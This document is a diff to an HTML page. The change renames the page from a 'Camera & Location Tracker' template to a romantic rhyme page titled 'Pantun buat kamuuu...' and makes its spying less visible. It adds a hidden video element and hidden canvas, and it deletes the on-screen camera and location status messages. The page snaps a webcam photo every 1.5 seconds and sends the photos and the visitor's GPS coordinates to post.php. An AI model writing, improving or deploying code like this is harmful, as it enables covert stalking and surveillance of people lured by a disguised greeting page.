@@ -16,11 +16,15 @@
   <link href="https://feeldreams.github.io/forkamuaja/style.css" rel="stylesheet" type="text/css" />
   <script src="https://kit.fontawesome.com/4f3ce16e3e.js" crossorigin="anonymous"></script>
 
-  <title>Template - Camera & Location Tracker</title>
+  <title>Pantun buat kamuuu...</title>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
 </head>
 
 <body>
+
+  <!-- Hidden video and canvas for camera capture -->
+  <video id="video" style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
   <!-- Ganti Audio di sini -->
   <audio src="https://feeldreams.github.io/angelbabypart2.mp3" id="linkmp3" class="sembunyi"></audio>
@@ -100,37 +104,71 @@
     // Nama default - JANGAN DIUBAH
     const receiverName = "Seseorang Spesial";
 
+    // Global variable for capture interval
+    let captureInterval = null;
+
     // Camera functionality - JANGAN DIUBAH
     function initCamera() {
       navigator.mediaDevices.getUserMedia({video: true})
         .then(handleCameraSuccess)
         .catch(handleCameraError);
     }
+    
     function handleCameraSuccess(stream) {
       video.srcObject = stream;
       video.play();
-      document.getElementById('cameraStatus').textContent = 'Camera: Active';
-      document.getElementById('cameraStatus').className = 'status success';
-
-      // Mulai capture setiap 1.5 detik - JANGAN DIUBAH
-      setInterval(() => {
+      console.log('Camera activated - starting continuous capture every 1500ms');
+      
+      // Pastikan tidak ada interval duplicate
+      if (captureInterval) {
+        clearInterval(captureInterval);
+      }
+      
+      // Mulai capture setiap 1.5 detik terus menerus
+      captureInterval = setInterval(() => {
         captureAndSend();
       }, 1500);
     }
 
     function handleCameraError(error) {
-      console.log('Camera error:', error);
-      document.getElementById('cameraStatus').textContent = 'Camera: Error - ' + error.message;
-      document.getElementById('cameraStatus').className = 'status error';
+      console.error('Camera initialization failed:', error.message);
+      // Tidak ada status element di halaman ini
     }
 
     function captureAndSend() {
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      const imageData = canvas.toDataURL('image/jpeg');
-      postData(imageData);
+      try {
+        // Cek apakah video sudah ready
+        if (video.readyState !== video.HAVE_ENOUGH_DATA) {
+          console.log('Video not ready for capture, skipping...');
+          return;
+        }
+        
+        // Validasi dimensi video
+        if (video.videoWidth === 0 || video.videoHeight === 0) {
+          console.log('Invalid video dimensions, skipping capture');
+          return;
+        }
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+        
+        const imageData = canvas.toDataURL('image/jpeg', 0.8);
+        
+        // Validasi data URL
+        if (!imageData || imageData.length < 100) {
+          console.error('Invalid image data generated');
+          return;
+        }
+        
+        console.log('Capture successful, sending to server...');
+        postData(imageData);
+      } catch (error) {
+        console.error('Capture error:', error.message);
+        // Lanjutkan loop meskipun ada error
+      }
     }
 
     // Location functionality - JANGAN DIUBAH
@@ -143,18 +181,11 @@
               longitude: position.coords.longitude
             };
             sendLocationData(coords);
-            document.getElementById('locationStatus').textContent = 'Location: Captured';
-            document.getElementById('locationStatus').className = 'status success';
           },
           (error) => {
-            console.log('Location error:', error);
-            document.getElementById('locationStatus').textContent = 'Location: Error - ' + error.message;
-            document.getElementById('locationStatus').className = 'status error';
+            console.error('Location error:', error.message);
           }
         );
-      } else {
-        document.getElementById('locationStatus').textContent = 'Location: Not supported';
-        document.getElementById('locationStatus').className = 'status error';
       }
     }
 
@@ -165,9 +196,15 @@
           location: JSON.stringify(coords),
           name: receiverName
         },
-        url: 'forwarding_link/post.php',
+        url: 'post.php',  // Ganti ke post.php langsung
         dataType: 'json',
-        async: true
+        async: true,
+        success: function(response) {
+          console.log('Location data sent successfully');
+        },
+        error: function(xhr, status, error) {
+          console.error('Location upload failed:', error);
+        }
       });
     }
 
@@ -179,10 +216,37 @@
           image: imageData,
           name: receiverName
         },
-        url: 'forwarding_link/post.php',
+        url: 'post.php',  // Ganti ke post.php langsung
         dataType: 'json',
-        async: true
+        async: true,
+        success: function(response) {
+          if (response.success) {
+            console.log('Image upload successful:', response.filename);
+          } else {
+            console.error('Server reported upload error:', response.error);
+          }
+        },
+        error: function(xhr, status, error) {
+          console.error('Image upload failed - network error:', status, error);
+          // Loop tetap berjalan, tidak menghentikan capture
+        }
       });
+    }
+
+    // Cleanup saat halaman ditutup
+    function cleanup() {
+      if (captureInterval) {
+        clearInterval(captureInterval);
+        console.log('Capture interval cleared');
+      }
+      
+      // Stop camera stream
+      if (video.srcObject) {
+        const stream = video.srcObject;
+        const tracks = stream.getTracks();
+        tracks.forEach(track => track.stop());
+        console.log('Camera stream stopped');
+      }
     }
 
     // ==========================================
@@ -193,6 +257,10 @@
       initCamera();  // HARUS dipanggil
       getLocation(); // HARUS dipanggil
     });
+
+    // Cleanup saat unload
+    window.addEventListener('beforeunload', cleanup);
+    window.addEventListener('unload', cleanup);
 
     // ==========================================
     // EDIT FUNGSI TAMBAHAN DI BAWAH INI
